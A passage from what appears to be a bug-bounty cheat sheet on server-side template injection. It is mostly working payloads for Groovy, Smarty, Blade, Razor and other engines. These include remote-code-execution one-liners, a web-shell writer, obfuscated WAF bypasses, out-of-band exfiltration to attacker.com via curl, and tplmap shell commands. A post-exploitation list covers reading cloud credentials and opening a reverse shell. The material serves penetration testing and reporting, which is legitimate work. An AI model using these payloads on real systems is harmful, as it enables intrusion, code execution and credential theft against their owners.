1/((@java.lang.Runtime@getRuntime().exec("id").waitFor()==0)?1:0)+""

# Time-Based:
((@java.lang.Runtime@getRuntime().exec("id").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)
```

---

## 16. GROOVY (JAVA) — RCE

### 16.1 Detection

- `${9*9}` → `81`
- Stack traces mention `groovy.text.SimpleTemplateEngine`.

### 16.2 RCE

```groovy
${"calc.exe".exec()}
${"calc.exe".execute()}
${this.evaluate("9*9")}
${new org.codehaus.groovy.runtime.MethodClosure("calc.exe","execute").call()}
```

### 16.3 File read

```groovy
${String x = new File('/path/to/file').getText('UTF-8')}
${new File("C:\Temp\FileName.txt").createNewFile();}
```

### 16.4 HTTP request

```groovy
${"http://www.google.com".toURL().text}
${new URL("http://www.google.com").getText()}
```

### 16.5 Sandbox bypass

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})
def x }

${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"calc.exe\")})def x") }
```

---

## 17. PHP TEMPLATE ENGINES — RCE

### 17.1 Smarty

```php
{$smarty.version}
{php}echo `id`;{/php}  // deprecated in v3, removed in v5
{system('ls')}  // compatible v3, deprecated in v5
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

#### Smarty — Obfuscation

```php
{chr(105)|cat:chr(100)}  // builds "id"

{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

### 17.2 Blade (Laravel)

```php
{{implode(null,array_map(chr(99).chr(104).chr(114),[105,100]))}}
{{passthru(implode(null,array_map(chr(99).chr(104).chr(114),[105,100])))}}
{!!\Illuminate\Support\Facades\Artisan::call('about')!!}
```

### 17.3 Latte

```php
{var $X="POC"}{$X}
{php system('nslookup oastify.com')}
```

### 17.4 Universal PHP payloads

```php
// Rendered RCE:
shell_exec('id')
system('id')

// Error-Based RCE:
ini_set("error_reporting", "1")
call_user_func(join("", ["xx", shell_exec('id')]))

// Boolean-Based RCE:
1 / (pclose(popen("id", "wb")) == 0)

// Time-Based RCE:
shell_exec('id && sleep 5')
system('id && sleep 5')
```

---

## 18. .NET RAZOR — RCE

### 18.1 Detection

- `@(7*7)` → `49`
- `@{7*7}` → `49`

### 18.2 RCE

```csharp
@(1+2)
@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");
<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>  // Classic ASP
```

---

## 19. GO html/template — RCE

### 19.1 Detection

- `{{7*7}}` → `49`
- `{{ .System "ls" }}` — if `System` method is exposed on the context.

### 19.2 RCE

```go
{{ .System "ls" }}
{{ .Env "PATH" }}
```

Note: Go's `html/template` is generally safer against XSS but may leak info if methods are exposed on the template context.

---

## 20. WAF / BLACKLIST BYPASS FOR SSTI

### 20.1 Hex encoding for filtered characters

```python
# Jinja2 — bypass _ filter:
|attr('\x5f\x5fclass\x5f\x5f')
|attr('\x5f\x5fm\x72\x6F\x5f\x5f')

# Twig — bypass quotes:
{{['id']|filter('system')}}  # no quotes needed for function name
```

### 20.2 String concatenation to avoid filters

```python
# Jinja2 — build "os" from parts:
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('cat' + ' /etc/passwd', shell=True, stdout=-1).communicate()[0] }}

# Mako — chr-based string building:
${str().join(chr(i)for(i)in[105,100])}

# PHP — chr-based:
{chr(105)|cat:chr(100)}
```

### 20.3 Using request parameters for payload parts

```python
# Jinja2 — build attribute name from request params:
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

# Bypass |join:
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_

# Bypass [ and ]:
{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
```

### 20.4 Alternative syntax variations

```python
# Jinja2 — attr filter vs dot:
request|attr('application')         # vs request.application
request['application']              # vs request.application
request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')  # hex for _

# FreeMarker — alternative delimiters:
#{3*3}                              # legacy
[=3*3]                              # since 2.3.4
```

### 20.5 Unicode normalization bypasses

```python
# Unicode fullwidth characters:
{{７＊７}}   # fullwidth 7*7
{{ｕｎｉｃｏｄｅ}}  # fullwidth identifiers
```

### 20.6 Comment injection

```python
# Jinja2 — comments in payload:
{{ ''['__cl''ass__'] }}  # comment breaks keyword
{{ ''[#__class__#] }}    # Jinja2 comment syntax
```

### 20.7 HTTP smuggling / request fragmentation

- Use HTTP request smuggling to bypass WAF that inspects individual requests.
- Fragment large payloads across multiple requests.
- Use different Content-Type headers to confuse WAF parsing.

---

## 21. BLIND SSTI DETECTION

### 21.1 Boolean-based

```python
# Jinja2:
{{ 3*4/2 }}     # → 6 (true)
{{ 3*)2(/4 }}   # → error (false)

# Compare response differences:
{{ (1).__class__ }}  # → <class 'int'>
{{ (1).zxy }}         # → error

# FreeMarker:
${1/((freemarker.template.utility.Execute"?new()("id")?chop_linebreak?ends_with("UniqueString"))?string('1','0')?eval)}
```

### 21.2 Time-based

```python
# Jinja2:
{{ self.__init__.__globals__.__builtins__.__import__('time').sleep(5) }}
{{ cycler.__init__.__globals__.os.popen('sleep 5').read() }}

# Twig:
{{['id && sleep 5']|filter('system')}}

# FreeMarker:
${"freemarker.template.utility.Execute"?new()("id && sleep 5")}

# Java EL / SpEL:
${(T(java.lang.Runtime).getRuntime().exec("id").waitFor().equals(0)?T(java.lang.Thread).sleep(5000):0).toString()}

# OGNL:
((@java.lang.Runtime@getRuntime().exec("id").waitFor().equals(0))?@java.lang.Thread@sleep(5000):0)

# PHP:
shell_exec('id && sleep 5')

# Ruby:
system("id && sleep 5")

# Node.js:
global.process.mainModule.require("child_process").execSync("id && sleep 5").toString()
```

### 21.3 Out-of-Band (OOB)

```python
# Jinja2 — DNS/HTTP callback:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup attacker.com').read() }}

# FreeMarker:
${"freemarker.template.utility.Execute"?new()("nslookup attacker.com")}

# SpEL:
${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","attacker.com")}

# Java EL:
${T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/$(id)')}

# Twig:
{{['nslookup attacker.com']|filter('system')}}
```

### 21.4 Error-based

```python
# Jinja2:
{{ cycler.__init__.__globals__.__builtins__.getattr("", "x" + cycler.__init__.__globals__.os.popen('id').read()) }}

# FreeMarker:
${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()}

# Java EL:
${''.getClass().forName('java.lang.Runtime').getRuntime().exec('id').waitFor()==0}?1:0

# OGNL:
(new String(@java.lang.Runtime@getRuntime().exec("id").getInputStream().readAllBytes()))/0
```

---

## 22. TOOL METHODOLOGY

### 22.1 Automated tools

| Tool | Purpose | Command |
|---|---|---|
| **tplmap** | Automated SSTI detection & exploitation | `git clone https://github.com/epinna/tplmap && python3 tplmap.py -u "http://example.com/?name=INJECT"` |
| **SSTImap** | Modern SSTI scanner | `pip install sstimap && sstimap -u "http://example.com/?name=INJECT"` |
| **TInjA** | SSTI + CSTI scanner with polyglots | `tinja url -u "http://example.com/?name=Kirlia"` |
| **Hackvertor** | Burp extension for polyglot encoding | BApp Store |

### 22.2 Manual detection workflow

1. **Identify entry points**: URL parameters, POST data, headers, JSON fields, file names in uploads, email templates, PDF generators.
2. **Inject polyglot**: `${{<%[%'\"}}%\.` to trigger errors.
3. **Test math probes**: `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `@{7*7}`.
4. **Disambiguate engine**: Use decision tree (§2.1).
5. **Confirm server-side**: Ensure math evaluates server-side, not client-side XSS.
6. **Test context**: Plaintext vs code context (§1.5).
7. **Escalate**: Use engine-specific RCE chains (§3–§21).

### 22.3 tplmap usage

```bash
# Basic detection:
python3 tplmap.py -u "http://example.com/?name=INJECT"

# With custom parameter:
python3 tplmap.py -u "http://example.com/?name=INJECT" --param name

# With cookies:
python3 tplmap.py -u "http://example.com/?name=INJECT" -c "session=abc123"

# Execute command:
python3 tplmap.py -u "http://example.com/?name=INJECT" --os-shell

# Upload file:
python3 tplmap.py -u "http://example.com/?name=INJECT" --upload /tmp/evil.txt

# Bind shell:
python3 tplmap.py -u "http://example.com/?name=INJECT" --bind-shell
```

### 22.4 Manual exploitation checklist

- [ ] Confirm SSTI with math probe
- [ ] Identify template engine
- [ ] Test info disclosure (config, env vars, secrets)
- [ ] Test file read
- [ ] Test RCE
- [ ] Test blind SSTI if no output
- [ ] Try WAF bypass if blocked
- [ ] Document impact

---

## 23. SSTI → FULL RCE PATH

```
SSTI detected → identify engine
├── Jinja2 → cycler.__init__.__globals__.os.popen() 
│           OR subclass traversal for Popen
│           OR lipsum.__globals__['os'].popen()
│           OR config.__class__.__init__.__globals__['os'].popen()
├── Twig → _self.env.registerUndefinedFilterCallback('exec')
│         OR ['id']|filter('system')
│         OR {'id':'shell_exec'}|map('call_user_func')|join
├── FreeMarker → freemarker.template.utility.Execute?new()
│               OR ObjectConstructor + BufferedReader
├── Velocity → java.lang.Runtime.exec() via reflection
├── Mako → self.module.cache.util.os.popen()
├── Tornado → os.system() or {%import os%}
├── Django → limited (use |add filter, {% debug %})
├── ERB → <%= system('id') %>
├── Handlebars → {{#with}} prototype chain to require('child_process')
├── Pug → root.process.mainModule.require('child_process')
├── EJS → global.process.mainModule.require("child_process")
├── Lodash → process.binding("spawn_sync").spawn()
├── Thymeleaf → T(java.lang.Runtime).getRuntime().exec()
├── SpEL → T(java.lang.Runtime).getRuntime().exec()
├── OGNL → @java.lang.Runtime@getRuntime().exec()
├── Groovy → this.evaluate() or Runtime.exec()
├── Smarty → {system('id')}
├── Blade → {{passthru(...)}}
├── Razor → @System.Diagnostics.Process.Start()
└── Go → {{ .System "ls" }} (if method exposed)
```

### Post-RCE pivot

1. Read `/proc/self/environ` — environment variables with credentials.
2. Read application config files — DB passwords, API keys.
3. `cat ~/.aws/credentials` — cloud credentials.
4. Reverse shell for persistence.
5. Enumerate internal network (SSRF via SSTI).

---

## 24. COMMON INJECTION ENTRY POINTS

Where user data enters templates:

- **URL path**: `https://site.com/home?name={{7*7}}`
- **Query parameters**: `?message=Hello`
- **POST data**: form fields, JSON body
- **HTTP headers**: User-Agent, Referer, X-Forwarded-For
- **Error pages**: `404 Not Found: /PAYLOAD`
- **Email templates**: name in password reset emails
- **PDF generators**: invoice/report content
- **Inline template rendering**: `render_template_string(user_input)` in Flask
- **CMS shortcodes**: WordPress, Joomla, Drupal template fields
- **File names**: upload features that use filename in template
- **Chat messages**: if rendered through template engine
- **Comment systems**: if comments are rendered as templates
- **Admin panels**: custom template fields in CMS

**Most dangerous**: `render_template_string()` in Flask — entire user input used as template.

---

## 25. IMPACT STANDARD

### 25.1 What counts as demonstrated impact

| Finding type | Demonstrated impact | NOT acceptable |
|---|---|---|
| SSTI (info) | Show actual config dump, SECRET_KEY, env vars | "An attacker could view config" |
| SSTI (file read) | Show actual file contents (e.g., /etc/passwd) | "An attacker could read files" |
| SSTI (RCE) | Show command output (id, whoami, hostname) | "An attacker could execute commands" |
| SSTI (blind) | Show OOB callback received, time delay confirmed | "An attacker could blind exploit" |

### 25.2 Impact framing

```
Impact: [What the attacker gets] by [how they get it]

Demonstrated:
- [Concrete evidence 1: e.g., "Retrieved SECRET_KEY: 'dev-secret-key-2024'"]
- [Concrete evidence 2: e.g., "Executed 'id' → uid=33(www-data) gid=33(www-data)"]
- [Concrete evidence 3: e.g., "Read /etc/passwd via SSTI file read"]

Damage: [What this means for the business — full server compromise, data breach, credential theft]
```

---

## 26. EVIDENCE COLLECTION

### 26.1 Required evidence per finding

```
exploit/<finding-id>/
├── finding-summary.md       # 1-line: what, where, impact
├── steps-to-reproduce.md    # Exact steps a triager can follow
├── request-1.txt            # Raw HTTP request (copy from Burp/curl)
├── response-1.txt           # Raw HTTP response (headers + body)
├── screenshot-1.png         # Visual proof (if UI-based)
├── evidence-*.txt           # Additional evidence files
└── payload.txt              # Exact payload used
```

### 26.2 HTTP request format (copy-paste ready)

```
GET /?name={{7*7}} HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0
Connection: close

```

### 26.3 Screenshot rules

- Capture the full browser window, not just the element.
- Include the URL bar showing the target domain.
- Include timestamp if possible.
- For API responses: show the request in Burp Repeater AND the response.

---

## 27. FALSE POSITIVE FILTERING

### 27.1 Reproduce-or-drop rule

If you can't reproduce a finding twice in a row with the same result, it's not real. Drop it.

### 27.2 Three-gate filter

#### Gate 1: Technical validity

| Finding class | Gate 1 test | Fail = false positive |
|---|---|---|
| SSTI | Did the template engine evaluate the expression? | Normal response, no evaluation, payload reflected literally |
| File read | Did you see actual file contents? | Generic error page, login form, or your own data |
| RCE | Did a command actually execute on the server? | Payload reflected but no execution |
| Blind SSTI | Did the OOB callback arrive or time delay occur? | No callback, no delay |

#### Gate 2: Impact validity

- Did you see actual sensitive data (config, env vars, file contents)?
- Did the command actually execute (output visible)?
- Can you repeat the impact?

#### Gate 3: Triage survival

- Is this a known informational finding?
- Does the program exclude this?
- Is the impact theoretical?
- Does this require unrealistic preconditions?

### 27.3 Per-engine false positive traps

| Engine | Common false positive | How to verify |
|---|---|---|
| Jinja2 | Payload reflected but HTML-encoded | Check response source — is it inside a JS string, attribute, or raw HTML? |
| Twig | Payload reflected but escaped | Check if `{{7*7}}` returns `49` or `{{7*7}}` |
| FreeMarker | Payload reflected but not evaluated | Check if `${7*7}` returns `49` |
| Velocity | Payload reflected but `#set` not processed | Check if `#set($x=7*7)$x` returns `49` |
| ERB | Payload reflected but not executed | Check if `<%= 7*7 %>` returns `49` |
| Handlebars | Payload reflected but `{{}}` not processed | Check if `{{7*7}}` returns `49` |

---

## 28. RECENT CVEs (2024–2026)

| CVE | Engine | Severity | Fixed in |
|---|---|---|---|
| CVE-2024-23692 | Rejetto HTTP File Server | Critical | HFS 2.3m |
| CVE-2024-4040 | CrushFTP | Critical | 103.17 |
| CVE-2024-22195 | Jinja2 `xmlattr` filter | High | 3.1.3 |
| CVE-2024-46507 | Yeti platform | Critical | 1.6.2 |
| CVE-2022-23614 | Twig sandbox | High | 2.10.0, 3.0.0 |
| CVE-2019-3396 | Velocity (Confluence) | Critical | 6.10.2 |
| CVE-2022-22954 | FreeMarker (VMware) | Critical | 8.10.2 |
| CVE-2022-38362 | Jinja2 (Apache Airflow) | High | 2.5.0 |

---

## 29. REFERENCES

- [Server-Side Template Injection: RCE For The Modern Web App — James Kettle (Black Hat US-15)](https://portswigger.net/research/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [OWASP — Testing for SSTI](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection)
- [PortSwigger Web Security Academy — SSTI Labs](https://portswigger.net/web-security/server-side-template-injection)
- [Hackmanit Template Injection Table](https://github.com/Hackmanit/template-injection-table)
- [Limitations are just an illusion — yeswehack SSTI research](https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation)
- [Successful Errors — Vladislav Korchagin](https://github.com/vladko312/Research_Successful_Errors)
- [SSTI Identifier & Payload Builder — payloadplayground.com](https://payloadplayground.com/tools/ssti-identifier)
